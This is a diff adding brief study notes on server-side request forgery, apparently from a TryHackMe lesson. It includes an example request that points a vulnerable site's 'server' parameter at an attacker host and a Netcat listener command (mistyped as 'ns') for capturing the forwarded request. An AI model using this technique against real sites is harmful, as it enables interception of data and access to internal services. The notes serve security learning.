@@ -1,0 +1,26 @@
+Server-Side Request Forgery
+
+where an attacker can force a web application to send requests on its behalf to arbitrary destinations, 
+while having control over the content of the request itself. 
+
+SSRF vulnerabilities often arise from implementations where our web application must use third-party services
+
+
+-The attacker would only need to make the following request to your website:
+
+    https://www.mysite.com/sms?server=attacker-MachineIp.thm&msg=ABC
+
+-This would make the vulnerable web application make a request to:
+
+    https://attacker.thm/api/send?msg=ABC 
+
+-You could then just capture the contents of the request using Netcat:
+
+    ns -lvp 80
+
+SSRF can be used for:
+
+Enumerate internal networks, including IP addresses and ports.
+Abuse trust relationships between servers and gain access to otherwise restricted services.
+Interact with some non-HTTP services to get remote code execution (RCE).
+
